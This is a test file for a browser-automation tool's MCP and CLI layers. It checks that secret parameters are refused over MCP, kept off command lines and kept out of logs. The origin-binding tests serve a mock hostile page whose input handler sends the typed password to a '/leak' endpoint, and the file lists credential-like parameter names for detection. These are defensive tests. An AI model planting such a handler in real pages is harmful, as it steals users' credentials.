import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import { createServer, type Server } from "node:http";
import { mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { ProfileManager } from "@jevitate/daemon";
import { ALLOWED_TOOLS } from "@jevitate/mcp-facade";
import type { Journey } from "@jevitate/journey";
import { buildMcpTools, type McpTool } from "./mcp-api.js";
import { CLI_TOOL_SPECS, type CliCommandSpec } from "./mcp-cli-tools.js";
import { makeInProcessCliRunner } from "./mcp-cli-runner.js";
import { buildProgram } from "./program.js";
import { journeyReviewHash } from "./journey-review.js";
import type { CliDeps } from "./cli-shared.js";
import { SECRET_PARAM_OVER_MCP } from "./secret-params.js";
import { prefixFromBranch, type RecordedBranch } from "./journey-prefix.js";
import { useSkippingTime } from "../../explore/src/testkit.js";

/**
 * The boundary: a secret parameter's value never travels through an MCP request (it would pass
 * through the model), and on the CLI it has a form that keeps it off the command line. Real tools,
 * the real CLI and real Chromium against a served page: the page only reports the typed value's
 * length, so a pass proves the right value was typed without the value being on the page.
 */

const VALUE = "S3ntinelVaLue9Zq";
const VAR = "JEV_TEST_SECRET_PARAM";
const MINTED = "minted-tok-9Zq";
let redirectTo: string | undefined;

let server: Server;
let origin: string;
let root: string;
let journeysDir: string;
let logs: string;
let pageLoads = 0;

function journey(id: string, secretName = "secret1", extra: Array<{ name: string }> = []): Journey {
  const j = {
    metadata: {
      id,
      name: id,
      promoted: true,
      params: [secretName, ...extra.map((p) => p.name)],
      parameters: [{ name: secretName, secret: true }, ...extra],
      createdAtIso: "2026-11-05T00:00:00.000Z",
    },
    recording: {
      version: "1",
      site: origin,
      pages: [
        {
          url: "/",
          steps: [
            { step: { kind: "navigate", url: "/", expect: { kind: "visible", target: { testId: "pw" } } } },
            { step: { kind: "fill", target: { label: "Password" }, value: { var: secretName }, expect: { kind: "visible", target: { testId: "pw" } } } },
            ...extra.map((p) => ({ step: { kind: "fill", target: { testId: "who" }, value: { var: p.name }, expect: { kind: "visible", target: { testId: "who" } } } })),
            { step: { kind: "click", target: { role: "button", name: "Sign in" }, expect: { kind: "textIncludes", target: { testId: "status" }, text: `len=${VALUE.length}` } } },
          ],
        },
      ],
    },
  } as unknown as Journey;
  j.metadata.approval = { contentHash: journeyReviewHash(j), at: "2026-11-05T00:00:00.000Z" } as never;
  return j;
}

/** A Journey with no secret at all, for "non-secret params are unchanged". */
function plainJourney(id: string): Journey {
  const j = journey(id, "who");
  j.metadata.parameters = [{ name: "who" }];
  j.recording.pages[0]!.steps = [
    { step: { kind: "navigate", url: "/", expect: { kind: "visible", target: { testId: "who" } } } },
    { step: { kind: "fill", target: { testId: "who" }, value: { var: "who" }, expect: { kind: "visible", target: { testId: "who" } } } },
  ] as never;
  j.metadata.approval = { contentHash: journeyReviewHash(j), at: "2026-11-05T00:00:00.000Z" } as never;
  return j;
}

function allFiles(dir: string): string[] {
  let names: string[];
  try {
    names = readdirSync(dir);
  } catch {
    return [];
  }
  return names.flatMap((n) => {
    const p = join(dir, n);
    return statSync(p).isDirectory() ? allFiles(p) : [p];
  });
}

/** Every file under the test's root that holds the value: the run records, results and logs included. */
function filesHoldingValue(value = VALUE): string[] {
  return allFiles(root).filter((f) => readFileSync(f).includes(value));
}

const cliDeps = (): CliDeps =>
  ({
    profiles: new ProfileManager(join(root, "profiles")),
    journeysDir,
    dbPath: join(root, "site.sqlite"),
    environmentsFile: join(root, "environments.json"),
    logs: { logsRoot: logs },
    explore: { targetsConfigPath: join(root, "targets.json") },
  }) as unknown as CliDeps;

function tool(name: string): McpTool {
  const t = buildMcpTools({
    journeysDir,
    pathRoots: [root],
    runRecordLogsRoot: logs,
    environmentsFile: join(root, "environments.json"),
    targetsConfigPath: join(root, "targets.json"),
    sitePolicyDbPath: join(root, "site.sqlite"),
    runCli: makeInProcessCliRunner(() => buildProgram(cliDeps())),
  }).find((x) => x.name === name);
  if (t === undefined) throw new Error(`${name} is not served`);
  return t;
}

async function call(name: string, args: Record<string, unknown>): Promise<{ isError: boolean; text: string; body: Record<string, unknown> }> {
  const r = await tool(name).handler(args);
  const text = r.content[0]!.text;
  return { isError: r.isError === true, text, body: JSON.parse(text) as Record<string, unknown> };
}

async function cli(args: string[]): Promise<{ out: string; err: string; exitCode: number }> {
  let out = "";
  let err = "";
  const program = buildProgram(cliDeps());
  program.exitOverride();
  const sinks = { writeOut: (s: string) => void (out += s), writeErr: (s: string) => void (err += s) };
  const apply = (c: typeof program): void => {
    c.configureOutput(sinks);
    for (const sub of c.commands) apply(sub as typeof program);
  };
  apply(program);
  const saved = process.exitCode;
  process.exitCode = 0;
  try {
    await program.parseAsync(args, { from: "user" });
    return { out, err, exitCode: Number(process.exitCode ?? 0) };
  } finally {
    process.exitCode = saved;
  }
}

beforeAll(async () => {
  server = createServer((req, res) => {
    if (req.url === "/mint") {
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify({ tok: MINTED, order: "ord-1" }));
      return;
    }
    if (req.url === "/go" && redirectTo !== undefined) {
      res.writeHead(302, { location: redirectTo }).end();
      return;
    }
    pageLoads += 1;
    res.writeHead(200, { "content-type": "text/html" });
    res.end(
      `<h1>Sign in</h1><label>Password <input id=pw data-testid=pw type=password></label><input data-testid=who>` +
        `<button onclick="document.querySelector('[data-testid=status]').textContent='len='+document.getElementById('pw').value.length">Sign in</button><p data-testid=status></p>`,
    );
  });
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
  origin = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
  root = mkdtempSync(join(tmpdir(), "jev-secret-param-"));
  journeysDir = join(root, "journeys");
  logs = join(root, "logs");
  mkdirSync(journeysDir, { recursive: true });
  const write = (j: Journey): void => writeFileSync(join(journeysDir, `${j.metadata.id}.json`), JSON.stringify(j));
  write(journey("login"));
  write(journey("login-with-user", "secret1", [{ name: "who" }]));
  write(plainJourney("plain"));
  // Not declared secret, but its name reads as a credential: the repo treats it as secret everywhere.
  const named = journey("named", "password");
  named.metadata.parameters = [{ name: "password" }];
  named.metadata.approval = { contentHash: journeyReviewHash(named), at: "2026-11-05T00:00:00.000Z" } as never;
  write(named);
  writeFileSync(join(root, "environments.json"), JSON.stringify({ local: { baseUrl: origin } }));
  writeFileSync(join(root, "targets.json"), JSON.stringify({ [origin]: { secretFields: [`label=Password=env:${VAR}`] } }));
  writeFileSync(join(root, "requests.jsonl"), "");
});

afterAll(() => {
  vi.unstubAllEnvs();
  server.closeAllConnections();
  server.close();
  rmSync(root, { recursive: true, force: true });
});

beforeEach(() => {
  vi.unstubAllEnvs();
  vi.stubEnv(VAR, VALUE);
  vi.stubEnv("JEVITATE_RUN_RECORD", "");
  rmSync(logs, { recursive: true, force: true });
  pageLoads = 0;
});

describe("MCP: a secret parameter's value is refused on every served path", { timeout: 120_000 }, () => {
  useSkippingTime();
  const params = { secret1: VALUE };
  const paths: Array<[string, () => Record<string, unknown>]> = [
    ["run_journey", () => ({ id: "login", params })],
    ["verify_journey", () => ({ id: "login", plan: true, params })],
    ["verify_journey", () => ({ id: "login", mutate: true, params })],
    ["journey_readiness", () => ({ id: "login", mode: "replay", env: "local", params })],
    ["chain_journeys", () => ({ from: "login", to: "plain", requests: join(root, "requests.jsonl"), params })],
    ["demo_journey", () => ({ id: "login", guide: join(root, "guide.md"), params })],
    ["annotate_journey", () => ({ id: "login", params })],
    ["run_load_test", () => ({ journeyId: "login", authorizedOrigin: [origin], concurrency: 1, iterations: 1, params })],
    ["run_exploration", () => ({ fromJourney: "login", atStep: "2", strategy: "goal", goal: "g", params })],
  ];

  it.each(paths)("%s: refused by name, before anything ran, and the value is nowhere", async (name, args) => {
    const r = await call(name, args());
    expect(r.isError).toBe(true);
    expect(r.body).toMatchObject({ error: "invalid_args", code: SECRET_PARAM_OVER_MCP, params: ["secret1"] });
    expect(String(r.body["message"])).toContain("secretFields");
    expect(r.text).not.toContain(VALUE);
    expect(pageLoads).toBe(0);
    expect(filesHoldingValue()).toEqual([]);
  });

  it("a credential-like name is a secret parameter too, as everywhere else in the repo", async () => {
    const r = await call("run_journey", { id: "named", params: { password: VALUE } });
    expect(r.body).toMatchObject({ code: SECRET_PARAM_OVER_MCP, params: ["password"] });
    expect(r.text).not.toContain(VALUE);
  });

  it("names only the secret one when a request mixes both, and echoes neither value", async () => {
    const r = await call("run_journey", { id: "login-with-user", params: { secret1: VALUE, who: "Ada-Plain" } });
    expect(r.body).toMatchObject({ code: SECRET_PARAM_OVER_MCP, params: ["secret1"] });
    expect(r.text).not.toContain(VALUE);
    expect(r.text).not.toContain("Ada-Plain");
  });

  it("a ${setup.x} reference holds no secret: it goes on to the fixture check it always had", async () => {
    const r = await call("run_journey", { id: "login", params: { secret1: "${setup.token}" } });
    expect(r.body["code"]).not.toBe(SECRET_PARAM_OVER_MCP);
    expect(String(r.body["message"])).toContain("setup.token");
  });

  it("a non-secret parameter is unchanged", async () => {
    const r = await call("run_journey", { id: "plain", params: { who: "Ada-Plain" } });
    expect(r.isError).toBe(false);
    expect(r.body["outcome"]).toBe("ok");
  });

  it("run_journey resolves the value from the operator's targets.json: nothing in the request, nothing back", async () => {
    const r = await call("run_journey", { id: "login", env: "local" });
    expect(r.isError, r.text).toBe(false);
    expect(r.body["outcome"]).toBe("ok");
    expect(r.text).not.toContain(VALUE);
    expect(allFiles(logs).length).toBeGreaterThan(0); // the run left its record...
    expect(filesHoldingValue()).toEqual([]); // ...without the value
  });

  it("a target's variable that is not set contributes nothing: the parameter is reported missing", async () => {
    vi.stubEnv(VAR, "");
    const r = await call("run_journey", { id: "login", env: "local" });
    expect(r.body).toMatchObject({ code: "E_INVALID_PARAMS" });
    expect(String(r.body["message"])).toContain("secret1");
    expect(pageLoads).toBe(0);
  });

  it("no env means no target: the parameter is reported missing, as before", async () => {
    const r = await call("run_journey", { id: "login" });
    expect(r.body).toMatchObject({ code: "E_INVALID_PARAMS" });
  });

  it("the served tools still equal ALLOWED_TOOLS", () => {
    const served = buildMcpTools({ journeysDir }).map((t) => t.name).sort();
    expect(served).toEqual([...ALLOWED_TOOLS].sort());
  });

  it("every mirrored command that takes --param says which Journeys the gate reads", () => {
    const commands = CLI_TOOL_SPECS.flatMap((s) => (s.command !== undefined ? [[s.name, s.command] as const] : Object.entries(s.actions ?? {}).map(([k, c]) => [`${s.name}.${k}`, c] as const)));
    const taking = commands.filter(([, c]: readonly [string, CliCommandSpec]) => Object.values(c.params).some((p) => p.kind === "params" && p.flag === "--param"));
    expect(taking.length).toBeGreaterThanOrEqual(8);
    for (const [name, c] of taking) expect(c.paramJourneys, name).toBeDefined();
  });
});

describe("CLI: a secret parameter off the command line", { timeout: 120_000 }, () => {
  useSkippingTime();
  const ok = (out: string): void => expect(JSON.parse(out)).toMatchObject({ ok: true, data: { outcome: "ok" } });

  it("--secret-field, the binding the Journey was authored with, supplies it from the environment", async () => {
    const r = await cli(["journey", "run", "login", "--secret-field", `label=Password=env:${VAR}`, "--json"]);
    ok(r.out);
    expect(r.out + r.err).not.toContain(VALUE);
    expect(r.err).not.toContain("command line");
    expect(filesHoldingValue()).toEqual([]);
  });

  it("the environment's secretFields in targets.json supply it with no flag at all", async () => {
    const r = await cli(["journey", "run", "login", "--env", "local", "--json"]);
    ok(r.out);
    expect(r.out + r.err).not.toContain(VALUE);
  });

  it("an explicit --param still wins and still works, with a warning that holds no value", async () => {
    const r = await cli(["journey", "run", "login", "--param", `secret1=${VALUE}`, "--json"]);
    ok(r.out);
    expect(r.err).toContain("secret1");
    expect(r.err).toContain("--secret-field");
    expect(r.out + r.err).not.toContain(VALUE);
    expect(filesHoldingValue()).toEqual([]);
  });

  it("a non-secret --param does not warn", async () => {
    const r = await cli(["journey", "run", "plain", "--param", "who=Ada-Plain", "--json"]);
    ok(r.out);
    expect(r.err).toBe("");
  });

  it("the other replay commands warn too", async () => {
    const r = await cli(["journey", "verify", "login", "--plan", "--param", `secret1=${VALUE}`, "--json"]);
    expect(r.err).toContain("secret1");
    expect(r.out + r.err).not.toContain(VALUE);
  });

  it.each([
    ["names no field of a secret parameter", ["--secret-field", `label=Nope=env:${VAR}`], "matches no secret parameter"],
    ["has an unset variable", ["--secret-field", "label=Password=env:JEV_TEST_UNSET_VAR"], "JEV_TEST_UNSET_VAR"],
    ["is a literal, not env:", ["--secret-field", `label=Password=${VALUE}`], "env:"],
    ["is a cmd: source", ["--secret-field", "label=Password=cmd:./read.sh"], "env:"],
  ])("a binding that %s is a usage error, before any browser, without the value", async (_why, flags, says) => {
    const r = await cli(["journey", "run", "login", ...flags, "--json"]);
    expect(JSON.parse(r.out)).toMatchObject({ ok: false, error: { code: "E_JOURNEY_RUN_ARGS" } });
    expect(r.out).toContain(says);
    expect(r.out + r.err).not.toContain(VALUE);
    expect(r.exitCode).toBe(64);
    expect(pageLoads).toBe(0);
  });
});

describe("which names count (H3, M3)", { timeout: 120_000 }, () => {
  useSkippingTime();
  const fillNamed = (name: string, secret?: boolean): Journey => {
    const j = journey(`named-${name}`, name);
    j.metadata.parameters = [{ name, ...(secret === undefined ? {} : { secret }) }];
    j.recording.pages[0]!.steps = [
      { step: { kind: "navigate", url: "/", expect: { kind: "visible", target: { testId: "who" } } } },
      { step: { kind: "fill", target: { testId: "who" }, value: { var: name }, expect: { kind: "visible", target: { testId: "who" } } } },
    ] as never;
    j.metadata.approval = { contentHash: journeyReviewHash(j), at: "2026-11-05T00:00:00.000Z" } as never;
    writeFileSync(join(journeysDir, `${j.metadata.id}.json`), JSON.stringify(j));
    return j;
  };

  it.each(["pwd", "jwt", "bearer", "authorization", "auth", "pin_code", "pinCode", "privateKey", "access_key", "mfa_code", "ssn", "cvv", "sess"])("%s is refused when undeclared", async (name) => {
    fillNamed(name);
    const r = await call("run_journey", { id: `named-${name}`, params: { [name]: VALUE } });
    expect(r.body).toMatchObject({ code: SECRET_PARAM_OVER_MCP, params: [name] });
    expect(r.text).not.toContain(VALUE);
  });

  it.each(["passengers", "footprint", "compass", "bypass_cache", "passport_country", "spin", "hotpink", "author", "authorName"])("%s runs without declaring anything", async (name) => {
    fillNamed(name);
    const r = await call("run_journey", { id: `named-${name}`, params: { [name]: "3" } });
    expect(r.body["outcome"], r.text).toBe("ok");
  });

  it.each(["token_count", "tokenCount", "session_name", "cookie_banner", "otp_channel"])("%s has a credential segment: refused until it declares secret: false", async (name) => {
    fillNamed(name);
    expect((await call("run_journey", { id: `named-${name}`, params: { [name]: "3" } })).body).toMatchObject({ code: SECRET_PARAM_OVER_MCP });
    fillNamed(name, false);
    const r = await call("run_journey", { id: `named-${name}`, params: { [name]: "3" } });
    expect(r.body["outcome"], r.text).toBe("ok");
    expect(r.body["output"]).toMatchObject({ [name]: "3" }); // and it is not redacted
  });
});

describe("a bound secret is typed only on its own origin (M1)", { timeout: 120_000 }, () => {
  useSkippingTime();
  let other: Server;
  let otherOrigin: string;
  let otherHits: string[] = [];

  beforeAll(async () => {
    other = createServer((req, res) => {
      otherHits.push(req.url ?? "");
      res.writeHead(200, { "content-type": "text/html" });
      // Whatever lands in the field goes straight to this server, with no click.
      res.end(`<label>Password <input id=pw data-testid=pw type=password oninput="fetch('/leak?v='+encodeURIComponent(this.value))"></label><button>Sign in</button><p data-testid=status></p>`);
    });
    await new Promise<void>((r) => other.listen(0, "127.0.0.1", r));
    otherOrigin = `http://127.0.0.1:${(other.address() as { port: number }).port}`;
    redirectTo = `${otherOrigin}/login`;
    const j = journey("redirected");
    (j.recording.pages[0]!.steps[0] as { step: { url: string } }).step.url = "/go";
    j.metadata.approval = { contentHash: journeyReviewHash(j), at: "2026-11-05T00:00:00.000Z" } as never;
    writeFileSync(join(journeysDir, "redirected.json"), JSON.stringify(j));
  });
  afterAll(() => {
    redirectTo = undefined;
    other.closeAllConnections();
    other.close();
  });
  beforeEach(() => {
    otherHits = [];
  });
  const noLeak = (): void => {
    expect(otherHits.length).toBeGreaterThan(0); // the redirect did land there...
    expect(otherHits.filter((u) => u.startsWith("/leak"))).toEqual([]); // ...and nothing was typed
  };

  it("targets.json over MCP: the step fails, and the other origin receives nothing", async () => {
    const r = await call("run_journey", { id: "redirected", env: "local" });
    expect(r.body["outcome"], r.text).not.toBe("ok");
    expect(r.text).toContain("E_SECRET_ORIGIN_REFUSED");
    expect(r.text).toContain(otherOrigin);
    expect(r.text).not.toContain(VALUE);
    noLeak();
  });

  it("--secret-field on the CLI: the same", async () => {
    const r = await cli(["journey", "run", "redirected", "--secret-field", `label=Password=env:${VAR}`, "--json"]);
    expect(r.out).toContain("E_SECRET_ORIGIN_REFUSED");
    expect(r.out + r.err).not.toContain(VALUE);
    noLeak();
  });

  it("the page's own origin still gets it", async () => {
    const r = await call("run_journey", { id: "login", env: "local" });
    expect(r.body["outcome"], r.text).toBe("ok");
  });
});

describe("one label, two secret parameters (M2)", { timeout: 120_000 }, () => {
  useSkippingTime();
  const OTHER_VAR = "JEV_TEST_SECRET_PARAM_2";
  beforeAll(() => {
    const j = journey("two-on-one");
    j.metadata.params = ["secret1", "secret2"];
    j.metadata.parameters = [{ name: "secret1", secret: true }, { name: "secret2", secret: true }];
    const steps = j.recording.pages[0]!.steps as unknown as Array<{ step: Record<string, unknown> }>;
    steps.splice(2, 0, { step: { kind: "fill", target: { label: "Password" }, value: { var: "secret2" }, expect: { kind: "visible", target: { testId: "pw" } } } });
    j.metadata.approval = { contentHash: journeyReviewHash(j), at: "2026-11-05T00:00:00.000Z" } as never;
    writeFileSync(join(journeysDir, "two-on-one.json"), JSON.stringify(j));
  });

  it("targets.json with one binding over MCP: refused by name, nothing typed", async () => {
    const r = await call("run_journey", { id: "two-on-one", env: "local" });
    expect(r.body).toMatchObject({ code: "E_SECRET_FIELD_AMBIGUOUS", params: ["secret1", "secret2"] });
    expect(pageLoads).toBe(0);
    expect(r.text).not.toContain(VALUE);
  });

  it.each([
    ["one flag", [`label=Password=env:${VAR}`]],
    ["two flags", [`label=Password=env:${VAR}`, `label=Password=env:${OTHER_VAR}`]],
  ])("%s on the CLI: exit 64, says ambiguous, not 'matches no parameter'", async (_n, specs) => {
    vi.stubEnv(OTHER_VAR, "AnotherValue14x");
    const r = await cli(["journey", "run", "two-on-one", ...specs.flatMap((s) => ["--secret-field", s]), "--json"]);
    expect(r.exitCode).toBe(64);
    expect(r.out).toContain("cannot say which value");
    expect(r.out).not.toContain("matches no secret parameter");
    expect(r.out + r.err).not.toContain(VALUE);
    expect(pageLoads).toBe(0);
  });

  it("--param for one of them settles it: the binding supplies the other", async () => {
    vi.stubEnv(OTHER_VAR, "AnotherValue14x");
    const r = await cli(["journey", "run", "two-on-one", "--param", "secret1=AnotherValue14x", "--secret-field", `label=Password=env:${VAR}`, "--json"]);
    expect(JSON.parse(r.out)).toMatchObject({ ok: true, data: { outcome: "ok" } }); // typed last: VALUE's length
  });
});

describe("a fixture output named like a credential (M4)", { timeout: 120_000 }, () => {
  useSkippingTime();
  const writeFixtures = (): string => {
    const file = join(root, "fixtures.json");
    writeFileSync(file, JSON.stringify({ setup: [{ name: "mint", method: "POST", url: "/mint", outputs: { authToken: "$.tok", orderId: "$.order" } }] }));
    return file;
  };

  it("is left out of fixtures.outputs, and a public one stays", async () => {
    const r = await call("run_journey", { id: "plain", fixtures: writeFixtures(), params: { who: "Ada" } });
    expect(r.text, r.text).not.toContain(MINTED);
    expect((r.body["fixtures"] as { outputs: unknown }).outputs).toEqual({ orderId: "ord-1" });
  });

  it("is redacted when a param carried it", async () => {
    const r = await call("run_journey", { id: "plain", fixtures: writeFixtures(), params: { who: "${setup.authToken}" } });
    expect(r.body["outcome"], r.text).toBe("ok");
    expect(r.text).not.toContain(MINTED);
    expect(filesHoldingValue(MINTED)).toEqual([]);
  });
});

describe("verify-fix and regression --param (L2)", () => {
  it("prefixFromBranch warns by name, without the value", async () => {
    const lines: string[] = [];
    const branch = { journeyId: "login", step: 1, replay: { journeysDir, params: {}, secretParams: ["secret1"] } } as unknown as RecordedBranch;
    await prefixFromBranch(branch, { params: { secret1: VALUE }, warn: (l) => lines.push(l) }).catch(() => undefined);
    expect(lines.join("")).toContain("secret1");
    expect(lines.join("")).not.toContain(VALUE);
  });
});
